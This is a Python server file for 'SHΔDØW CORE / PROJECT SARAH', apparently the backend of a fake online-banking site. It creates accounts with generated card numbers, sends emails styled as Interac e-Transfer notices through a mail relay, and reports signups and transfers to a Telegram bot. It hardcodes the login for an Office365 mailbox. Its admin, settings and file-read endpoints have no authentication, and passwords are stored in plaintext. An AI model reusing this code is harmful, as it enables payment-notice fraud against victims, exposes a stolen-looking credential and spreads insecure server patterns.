import http.server
import socketserver
import json
import os
import urllib.request
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import sys


PORT = 8081

# Core System Configuration
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PYTHON_USERS_FILE = os.path.join(BASE_DIR, "data", "python_users.json")
GLOBAL_SETTINGS_FILE = os.path.join(BASE_DIR, "data", "PROJECTSARAH.json")

def load_users():
    if os.path.exists(PYTHON_USERS_FILE):
        try:
            with open(PYTHON_USERS_FILE, "r") as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading python_users.json: {e}")
    return {}

def save_users(users):
    try:
        os.makedirs(os.path.dirname(PYTHON_USERS_FILE), exist_ok=True)
        with open(PYTHON_USERS_FILE, "w") as f:
            json.dump(users, f, indent=4)
    except Exception as e:
        print(f"Error saving python_users.json: {e}")

USERS = load_users()

FAILED_ATTEMPTS = {} # email -> count

PENDING_APPROVALS = []
ACTIVE_CALLS = {} # email -> { status: 'ringing' | 'connected', started_at: iso }
CHAT_MESSAGES = [
    {"id": "1", "sender": "system", "text": "Welcome to SHΔDØW CORE Support.", "timestamp": "2026-04-24T12:00:00Z"}
]

def get_setting(key, default=None):
    # Mapping for central PROJECTSARAH.json structure
    mapping = {
        "smtp_host": "smtp.host", 
        "smtp_port": "smtp.port",
        "smtp_user": "smtp.user",
        "smtp_pass": "smtp.pass",
        "sender_name": "smtp.senderName",
        "bot_token": "telegram.token",
        "chat_id": "telegram.chatId"
    }
    
    config = load_settings()
    settings = config.get("settings", {})
    mapped_key = mapping.get(key, key)
    
    if "." in mapped_key:
        section, k = mapped_key.split(".")
        return settings.get(section, {}).get(k, default)
    
    return settings.get(mapped_key, default)

def load_settings():
    """
    Load settings from central PROJECTSARAH.json
    """
    if os.path.exists(GLOBAL_SETTINGS_FILE):
        try:
            with open(GLOBAL_SETTINGS_FILE, "r") as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading PROJECTSARAH.json: {e}")
    
    if os.path.exists("settings.json"):
        try:
            with open("settings.json", "r") as f:
                data = json.load(f)
                return {"settings": data} if "settings" not in data else data
        except: pass
        
    # Default fallbacks
    return {
        "settings": {
            "mailer_backend": "node",
            "smtp": {
                "host": "smtp.office365.com",
                "port": 587,
                "user": "accounting@abfarms.ca",
                "pass": "Covid-1919!!",
                "senderName": "PROJECT SARAH"
            },
            "telegram": {
                "token": "",
                "chatId": ""
            }
        }
    }

def save_settings(settings):
    with open("settings.json", "w") as f:
        json.dump(settings, f, indent=4)

SYSTEM_SETTINGS = load_settings()
# Re-mapping get_setting to use the dynamic load for now
def get_setting_dynamic(key, default=None):
    return get_setting(key, default)

def update_setting(key, value):
    SYSTEM_SETTINGS[key] = value
    save_settings(SYSTEM_SETTINGS)

def send_to_telegram(text, reply_markup=None, topic=None):
    token = get_setting("bot_token")
    chat_id = get_setting("chat_id")
    
    if not token or not chat_id:
        print("Telegram config missing (token or chat_id), skipping relay.")
        return False

    # Disclaimer
    disclaimer = "\n\n<i>--- SHΔDØW CORE: ENCRYPTED INTERNAL COMMUNICATION ---</i>"
    text += disclaimer

    url = f"https://api.telegram.org/bot{token}/sendMessage"                
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }                

    # Dynamic Reply Keyboard Setup (if admin topic)
    if topic == "admin" and not reply_markup:
        payload["reply_markup"] = {
            "inline_keyboard": [
                [{"text": "✅ Approve", "callback_data": "approve"}, {"text": "❌ Deny", "callback_data": "deny"}]
            ]
        }
    elif reply_markup:
        payload["reply_markup"] = reply_markup
        
    req_data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=req_data, headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=5)
        return True
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

def send_email(to_email, subject, body):
    print(f"[SMTP RELAY - NODE JS CORE] To: {to_email} | Subject: {subject}")
    
    payload = {
        "recipient_email": to_email,
        "subject": subject,
        "body": body
    }
    
    req_data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        "http://127.0.0.1:3000/api/mailer",
        data=req_data,
        headers={
            "Content-Type": "application/json",
            "x-auth-token": "projectsarah"
        }
    )
    
    try:
        urllib.request.urlopen(req, timeout=5)
        print(f"[SMTP SUCCESS] Email successfully relayed to Node.js core")
        return True
    except Exception as e:
        print(f"[SMTP FAILURE] Error relaying email to Node.js core: {str(e)}")
        return False

class BackendHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        try:
            parsed_path = urlparse(self.path)
            if parsed_path.path in ("/api/python", "/api"):
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                response = {
                    "version": "V99",
                    "endpoints": [
                        "/health",
                        "/accounts",
                        "/user",
                        "/contacts",
                        "/transactions",
                        "/chat",
                        "/admin/users",
                        "/admin/pending",
                        "/admin/settings",
                        "/admin/files/list",
                        "/admin/files/read"
                    ]
                }
                self.wfile.write(json.dumps(response).encode("utf-8"))
            
            elif parsed_path.path in ("/api/python/health", "/health"):
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                response = {"status": "ok", "message": "FastAPI engine V99 online. (Falling back to pure Python)"}
                self.wfile.write(json.dumps(response).encode("utf-8"))
            
            elif parsed_path.path in ("/api/python/accounts", "/accounts"):
                query = parse_qs(parsed_path.query)
                email = query.get("email", [None])[0]
                user = USERS.get(email)
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                response = {
                    "accounts": user.get('accounts', []) if user else [],
                    "total": "$14,795.68",
                    "balances": {"have": "$16,795.68", "owe": "$1,392.23"}
                }
                self.wfile.write(json.dumps(response).encode("utf-8"))

            elif parsed_path.path in ("/api/python/admin/users", "/admin/users"):
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(list(USERS.values())).encode("utf-8"))

            elif parsed_path.path in ("/api/python/admin/settings", "/admin/settings"):
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(SYSTEM_SETTINGS).encode("utf-8"))

            elif parsed_path.path in ("/api/python/chat", "/chat"):
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(CHAT_MESSAGES).encode("utf-8"))

            elif parsed_path.path in ("/api/python/user", "/user"):
                query = parse_qs(parsed_path.query)
                email = query.get("email", [None])[0]
                user = USERS.get(email)
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                response = user if user else {}
                self.wfile.write(json.dumps(response).encode("utf-8"))

            elif parsed_path.path in ("/api/python/admin/pending", "/admin/pending"):
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(PENDING_APPROVALS).encode("utf-8"))

            elif parsed_path.path in ("/api/python/admin/files/list", "/admin/files/list"):
                query = parse_qs(parsed_path.query)
                base_dir = query.get("path", ["webroot"])[0]
                if ".." in base_dir: base_dir = "webroot"
                
                try:
                    files = []
                    # Ensure the path exists
                    if not os.path.exists(base_dir):
                        os.makedirs(base_dir, exist_ok=True)

                    for item in os.listdir(base_dir):
                        item_path = os.path.join(base_dir, item)
                        files.append({
                            "name": item,
                            "path": item_path,
                            "is_dir": os.path.isdir(item_path),
                            "size": os.path.getsize(item_path) if not os.path.isdir(item_path) else 0,
                            "modified": datetime.fromtimestamp(os.path.getmtime(item_path)).isoformat()
                        })
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(files).encode("utf-8"))
                except Exception as e:
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": str(e)}).encode("utf-8"))

            elif parsed_path.path in ("/api/python/admin/files/read", "/admin/files/read"):
                query = parse_qs(parsed_path.query)
                file_path = query.get("path", [""])[0]
                if ".." in file_path or not file_path:
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": "Forbidden"}).encode("utf-8"))
                    return
                
                try:
                    with open(file_path, "r") as f:
                        content = f.read()
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"content": content}).encode("utf-8"))
                except Exception as e:
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": str(e)}).encode("utf-8"))

            elif parsed_path.path in ("/api/python/contacts", "/contacts"):
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                response = [
                    {"id": "1", "name": "John Doe", "email": "john@example.com"},
                    {"id": "2", "name": "Sarah Smith", "email": "sarah@example.com"},
                    {"id": "3", "name": "AB Suppliers", "email": "billing@absuppliers.ca"}
                ]
                self.wfile.write(json.dumps(response).encode("utf-8"))
            
            elif parsed_path.path in ("/api/python/transactions", "/transactions"):
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                response = [
                    {"id": "t1", "date": "Oct 24", "description": "Interac e-Transfer from John Doe", "amount": "+$150.00", "type": "credit"},
                    {"id": "t2", "date": "Oct 23", "description": "AB Suppliers", "amount": "-$2,450.00", "type": "debit"},
                    {"id": "t3", "date": "Oct 21", "description": "Grocery Store", "amount": "-$84.20", "type": "debit"},
                    {"id": "t4", "date": "Oct 20", "description": "Payroll Deposit", "amount": "+$3,200.00", "type": "credit"}
                ]
                self.wfile.write(json.dumps(response).encode("utf-8"))

            elif parsed_path.path == "/api/python/call-status":
                query = parse_qs(parsed_path.query)
                email = query.get("email", [None])[0]
                status = ACTIVE_CALLS.get(email, {"status": "idle"})
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(status).encode("utf-8"))
            
            else:
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error": "Not found"}')
        except Exception as e:
            print(f"[!] GET ERROR: {str(e)}")
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Internal engine failure", "details": str(e)}).encode("utf-8"))

    def do_POST(self):
        try:
            print(f"POST request: {self.path}")
            parsed_path = urlparse(self.path)
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data) if post_data else {}

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()

            routes = {
                "/api/python/signup": self.handle_signup,
                "/signup": self.handle_signup,
                "/api/python/admin/update-settings": self.handle_update_settings,
                "/admin/update-settings": self.handle_update_settings,
                "/api/python/telegram/webhook": self.handle_telegram_webhook,
                "/telegram/webhook": self.handle_telegram_webhook,
                "/api/python/send-chat": self.handle_send_chat,
                "/send-chat": self.handle_send_chat,
                "/api/python/admin/call-user": self.handle_call_user,
                "/api/python/admin/end-call": self.handle_end_call,
                "/api/python/user/answer-call": self.handle_answer_call,
                "/api/python/admin/approve": self.handle_approve_user,
                "/admin/approve": self.handle_approve_user,
                "/api/python/forgot-password": self.handle_forgot_password,
                "/forgot-password": self.handle_forgot_password,
                "/api/python/etransfer": self.handle_etransfer,
                "/etransfer": self.handle_etransfer,
                "/api/python/login": self.handle_login,
                "/login": self.handle_login,
                "/api/python/mailer": self.handle_mailer_relay,
            }

            handler = routes.get(parsed_path.path)
            if handler:
                handler(data)
            else:
                self.wfile.write(b'{"error": "Endpoint not found"}')
        except Exception as e:
            print(f"[!] POST ERROR: {str(e)}")
            # We already sent headers, but try to write error
            try:
                self.wfile.write(json.dumps({"error": "Internal engine failure", "details": str(e)}).encode("utf-8"))
            except:
                pass


    def handle_mailer_relay(self, data):
        """
        Relay endpoint for external or legacy triggers (Shadow Core V99)
        Ensures consistent SMTP output.
        """
        host_url = f"http://{self.headers.get('Host', 'localhost:3000')}"
        recipient_email = data.get('recipient_email')
        subject = data.get('subject', 'Notice')
        body = data.get('body', '')

        if not recipient_email:
            self.wfile.write(b'{"error": "Missing recipient"}')
            return

        # Perform actual SMTP send
        success = send_email(recipient_email, subject, body)

        self.wfile.write(json.dumps({"success": success}).encode("utf-8"))


    def handle_signup(self, data):
        if not get_setting("account_enabled", True):
            self.wfile.write(json.dumps({"status": "error", "message": "Account creation is currently disabled"}).encode("utf-8"))
            return
        
        email = data.get("email")
        name = data.get("name")
        password = data.get("password")
        username = data.get("username", email.split('@')[0] if email else "user")
        
        if email in USERS:
            self.wfile.write(json.dumps({"status": "error", "message": "User already exists"}).encode("utf-8"))
        else:
            import random
            card_num = f"4539 {' '.join([''.join([str(random.randint(0,9)) for _ in range(4)]) for _ in range(3)])}"
            
            user_data = {
                "name": name,
                "email": email,
                "password": password,
                "username": username,
                "phone": data.get("phone", "N/A"),
                "card_number": card_num,
                "account_type": data.get("account_type", "Standard Savings"),
                "security_word": data.get("security_word", "SARAH"),
                "status": "PENDING",
                "created_at": datetime.now().isoformat()
            }
            PENDING_APPROVALS.append(user_data)
            
            telegram_text = (
                f"<b>🚨 NEW SIGNUP ATTEMPT</b>\n\n"
                f"<b>Name:</b> {name}\n"
                f"<b>Email:</b> {email}\n"
                f"<b>Target Username:</b> @{username}\n\n"
                f"<i>Application held in Shadow Core for administrative authorization.</i>"
            )
            send_to_telegram(telegram_text, topic="admin")
            
            # Bot notification for signon attempt
            send_to_telegram(f"👤 User signup attempt: {email}", topic="support")
            
            send_email(email, "SHΔDØW CORE: Application Received", f"Hello {name}, your application is under review.")
            self.wfile.write(json.dumps({"status": "success", "message": "Signup request sent to admin"}).encode("utf-8"))


    def handle_login(self, data):
        email = data.get("email")
        password = data.get("password")
        
        user = USERS.get(email)
        attempts = FAILED_ATTEMPTS.get(email, 0)

        if attempts >= 3:
            self.wfile.write(json.dumps({"status": "error", "message": "Too many failed attempts. Please reset password.", "action": "redirect_reset"}).encode("utf-8"))
            return

        if user and user.get('password') == password:
            FAILED_ATTEMPTS[email] = 0
            self.wfile.write(json.dumps({"status": "success", "user": {"name": user['name'], "email": user['email'], "role": user.get('role', 'USER')}}).encode("utf-8"))
        else:
            FAILED_ATTEMPTS[email] = attempts + 1
            self.wfile.write(json.dumps({"status": "error", "message": f"Invalid email or password. Attempt {attempts + 1}/3"}).encode("utf-8"))

    def handle_update_settings(self, data):
        for key, value in data.items():
            update_setting(key, value)
        self.wfile.write(json.dumps({"status": "success", "message": "Settings updated"}).encode("utf-8"))

    def handle_telegram_webhook(self, data):
        if "message" in data:
            msg_data = data["message"]
            text = msg_data.get("text")
            from_user = msg_data.get("from", {}).get("username", "Admin")
            if text:
                msg = {
                    "id": str(len(CHAT_MESSAGES) + 1),
                    "sender": f"@{from_user}",
                    "text": text,
                    "timestamp": datetime.now().isoformat()
                }
                CHAT_MESSAGES.append(msg)
                
                # Emit to Node.js Socket.IO server
                try:
                    emit_data = json.dumps({"event": "telegram_message", "data": msg}).encode("utf-8")
                    req = urllib.request.Request(
                        "http://127.0.0.1:3000/api/socket/emit?token=projectsarah",
                        data=emit_data,
                        headers={'Content-Type': 'application/json'}
                    )
                    urllib.request.urlopen(req, timeout=2)
                except Exception as e:
                    print(f"Failed to emit socket event: {e}")

                # Command Parsing
                if text.startswith("/"):
                    parts = text.split(" ")
                    cmd = parts[0][1:]
                    
                    if cmd == "debug":
                        send_to_telegram(f"System Operational\nUsers: {len(USERS)}\nPending: {len(PENDING_APPROVALS)}", topic="admin")
                    elif cmd == "monitor":
                        send_to_telegram("Monitoring active.", topic="admin")
                    elif cmd == "addUser" and len(parts) >= 3:
                        email, name = parts[1], parts[2]
                        USERS[email] = {"name": name, "email": email, "password": "temp", "status": "APPROVED"}
                        send_to_telegram(f"User added: {email}", topic="admin")
                    elif cmd == "removeUser" and len(parts) >= 2:
                        email = parts[1]
                        if email in USERS:
                            del USERS[email]
                            send_to_telegram(f"User removed: {email}", topic="admin")
                    elif cmd == "set" and len(parts) >= 3:
                        update_setting(parts[1], parts[2])
                        send_to_telegram(f"Setting {parts[1]} updated to {parts[2]}", topic="admin")

        self.wfile.write(json.dumps({"status": "ok"}).encode("utf-8"))

    def handle_send_chat(self, data):
        sender = data.get("sender", "User")
        text = data.get("text", "")
        msg = {
            "id": str(len(CHAT_MESSAGES) + 1),
            "sender": sender,
            "text": text,
            "timestamp": datetime.now().isoformat()
        }
        CHAT_MESSAGES.append(msg)
        
        if sender == "User":
            send_to_telegram(f"NEW SUPPORT TICKET: {text}", topic="support")
            
        self.wfile.write(json.dumps(msg).encode("utf-8"))

    def handle_call_user(self, data):
        email = data.get("email")
        ACTIVE_CALLS[email] = {"status": "ringing", "started_at": datetime.now().isoformat()}
        self.wfile.write(json.dumps({"status": "success"}).encode("utf-8"))

    def handle_end_call(self, data):
        email = data.get("email")
        ACTIVE_CALLS.pop(email, None)
        self.wfile.write(json.dumps({"status": "success"}).encode("utf-8"))

    def handle_answer_call(self, data):
        email = data.get("email")
        if email in ACTIVE_CALLS:
            ACTIVE_CALLS[email]["status"] = "connected"
        self.wfile.write(json.dumps({"status": "success"}).encode("utf-8"))

    def handle_approve_user(self, data):
        email = data.get("email")
        initial_balance = data.get("initial_balance", "$0.00")
        transfer_limit = data.get("transfer_limit", "$500.00")
        
        for i, p in enumerate(PENDING_APPROVALS):
            if p['email'] == email:
                user_data = PENDING_APPROVALS.pop(i)
                USERS[email] = {
                    "name": user_data.get("name"),
                    "email": user_data.get("email"),
                    "username": user_data.get("username"),
                    "password": user_data.get("password"),
                    "phone": user_data.get("phone", "N/A"),
                    "status": "APPROVED",
                    "card_number": user_data.get("card_number"),
                    "account_type": user_data.get("account_type"),
                    "security_word": user_data.get("security_word", "SARAH"),
                    "balance": initial_balance,
                    "limit": transfer_limit,
                    "created_at": user_data.get("created_at")
                }
                save_users(USERS)
                send_to_telegram(
                    f"<b>✅ USER APPROVED</b>\n\n"
                    f"<b>Email:</b> {email}\n"
                    f"<b>Balance:</b> {initial_balance}\n"
                    f"<b>Limit:</b> {transfer_limit}\n"
                    f"<b>Status:</b> ACTIVE",
                    topic="admin"
                )
                send_email(email, "SHΔDØW CORE: Account Activated", f"Your account has been activated with balance {initial_balance}.")
                self.wfile.write(json.dumps({"status": "success"}).encode("utf-8"))
                return
        self.wfile.write(json.dumps({"status": "error", "message": "Request not found"}).encode("utf-8"))

    def handle_forgot_password(self, data):
        email = data.get("email")
        security_word = data.get("security_word")
        new_password = data.get("new_password")
        
        if email in USERS:
            if USERS[email]["security_word"].upper() == security_word.upper():
                USERS[email]["password"] = new_password
                save_users(USERS)
                self.wfile.write(json.dumps({"status": "success", "message": "Password updated successfully"}).encode("utf-8"))
            else:
                self.wfile.write(json.dumps({"status": "error", "message": "Incorrect security word"}).encode("utf-8"))
        else:
            self.wfile.write(json.dumps({"status": "error", "message": "User not found"}).encode("utf-8"))

    def dispatch_via_relay(self, dispatch_data):
        """
        Proxies dispatch requests to the Node relay for consistent encryption.
        """
        try:
            recipient = dispatch_data.get('recipient_email')
            print(f"[*] Relaying mail request for {recipient} to Node.js Primary Core (3000)...")
            
            # Ensure essential fields
            if 'template' not in dispatch_data:
                dispatch_data['template'] = 'Transfer.html'
            if 'subject' not in dispatch_data:
                dispatch_data['subject'] = 'Interac e-Transfer Notice'

            req_encoded = json.dumps(dispatch_data).encode('utf-8')
            req = urllib.request.Request(
                "http://127.0.0.1:3000/api/mailer",
                data=req_encoded,
                headers={
                    'Content-Type': 'application/json', 
                    'X-Auth-Token': 'projectsarah',
                    'User-Agent': 'ShadowCore/9.0 Python-Relay'
                }
            )
            try:
                with urllib.request.urlopen(req, timeout=10) as response:
                    res_raw = response.read().decode('utf-8')
                    print(f"[+] Relay Success for {recipient}: {res_raw}")
                    return json.loads(res_raw)
            except urllib.error.HTTPError as e:
                err_text = e.read().decode('utf-8') if e.fp else "No body"
                print(f"[!] Relay HTTP ERROR {e.code}: {err_text}")
                return {"success": False, "error": f"HTTP {e.code}", "details": err_text}
            except Exception as e:
                print(f"[!] Relay CONNECTION ERROR: {str(e)}")
                return {"success": False, "error": "Connection failed", "details": str(e)}
        except Exception as e:
            print(f"[!] Relay PROXY LOGIC CRITICAL FAILURE: {str(e)}")
            return {"success": False, "error": "Relay failure", "details": str(e)}

    def handle_etransfer(self, data):
        if not get_setting("etransfer_enabled", True):
            self.wfile.write(json.dumps({"status": "error", "message": "eTransfers are currently disabled"}).encode("utf-8"))
            return

        sender_email = data.get("sender_email")
        receiver_email = data.get("receiver_email")
        amount_str = str(data.get("amount", "0")).replace('$', '').replace(',', '')
        try:
            amount = float(amount_str)
        except:
            amount = 0
        
        sender = USERS.get(sender_email)
        receiver = USERS.get(receiver_email)
        
        if sender:
            s_bal_val = sender.get('balance', 0)
            if isinstance(s_bal_val, str):
                s_bal = float(s_bal_val.replace('$', '').replace(',', ''))
            else:
                s_bal = float(s_bal_val)

            if s_bal >= amount:
                new_s_bal = s_bal - amount
                if isinstance(s_bal_val, str):
                    sender['balance'] = f"${new_s_bal:,.2f}"
                else:
                    sender['balance'] = new_s_bal
                
                if receiver:
                    r_bal_val = receiver.get('balance', 0)
                    if isinstance(r_bal_val, str):
                        r_bal = float(r_bal_val.replace('$', '').replace(',', ''))
                    else:
                        r_bal = float(r_bal_val)
                    
                    new_r_bal = r_bal + amount
                    if isinstance(r_bal_val, str):
                        receiver['balance'] = f"${new_r_bal:,.2f}"
                    else:
                        receiver['balance'] = new_r_bal
                
                # Persistence
                save_users(USERS)
                
                # Notify Sender
                send_to_telegram(
                    f"<b>💸 TRANSFER SENT (Auto-Deposit)</b>\n\n"
                    f"<b>From:</b> {sender_email}\n"
                    f"<b>To:</b> {receiver_email}\n"
                    f"<b>Amount:</b> ${amount:,.2f}\n"
                    f"<b>New Balance:</b> {sender['balance']}",
                    topic="transactions"
                )
                send_email(sender_email, "SHΔDØW CORE: Transfer Sent", f"You sent ${amount:,.2f} to {receiver_email}. Funds were auto-deposited.")
                
                # Notify Receiver
                send_to_telegram(
                    f"<b>💰 TRANSFER RECEIVED (Auto-Deposit)</b>\n\n"
                    f"<b>From:</b> {sender_email}\n"
                    f"<b>To:</b> {receiver_email}\n"
                    f"<b>Amount:</b> ${amount:,.2f}\n"
                    f"<b>New Balance:</b> {receiver['balance']}",
                    topic="transactions"
                )
                send_email(receiver_email, "SHΔDØW CORE: Funds Received", f"You received ${amount:,.2f} from {sender_email}. Funds auto-deposited.")
                
                # Shadow Core Dispatch (merged logic)
                dispatch_data = {
                    "recipient_email": receiver_email,
                    "recipient_name": receiver.get("name", "Client"),
                    "amount": str(amount),
                    "deposit_payload": {
                        "senderName": sender.get("name", "SHΔDØW USER"),
                        "amount": str(amount),
                        "memo": data.get("memo", ""),
                        "timestamp": datetime.now().isoformat()
                    }
                }
                self.dispatch_via_relay(dispatch_data)

                self.wfile.write(json.dumps({
                    "status": "success", 
                    "message": "Transfer completed via SHΔDØW Auto-Deposit.",
                    "reference": "SHAD-" + os.urandom(4).hex().upper()
                }).encode("utf-8"))
            else:
                    # Pending transfer - Dispatch email with link
                    dispatch_data = {
                        "recipient_email": receiver_email,
                        "recipient_name": "Client",
                        "amount": str(amount),
                        "deposit_payload": {
                            "senderName": sender.get("name", "SHΔDØW USER"),
                            "amount": str(amount),
                            "memo": data.get("memo", ""),
                            "timestamp": datetime.now().isoformat()
                        }
                    }
                    self.dispatch_via_relay(dispatch_data)
                    
                    send_to_telegram(f"<b>📤 TRANSFER PENDING</b>\n\n<b>From:</b> {sender_email}\n<b>To:</b> {receiver_email}\n<b>Amount:</b> ${amount:,.2f}", topic="transactions")
                    self.wfile.write(json.dumps({
                        "status": "success", 
                        "message": "Notice sent to receiver. Waiting for acceptance.",
                        "reference": "SHAD-" + os.urandom(4).hex().upper()
                    }).encode("utf-8"))
        else:
            self.wfile.write(json.dumps({"status": "error", "message": "Sender authentication failed"}).encode("utf-8"))

Handler = BackendHandler
socketserver.TCPServer.allow_reuse_address = True

# Hardened Socket Binding (Shadow Core V99)
class shadowServer(socketserver.TCPServer):
    def server_bind(self):
        import socket
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(self.server_address)
        self.server_activate()

if __name__ == "__main__":
    print(f"Shadow Core V99 Python Engine starting on port {PORT}...")
    with shadowServer(("127.0.0.1", PORT), BackendHandler) as httpd:
        print("Engine active. Serving inter-process requests.")
        httpd.serve_forever()
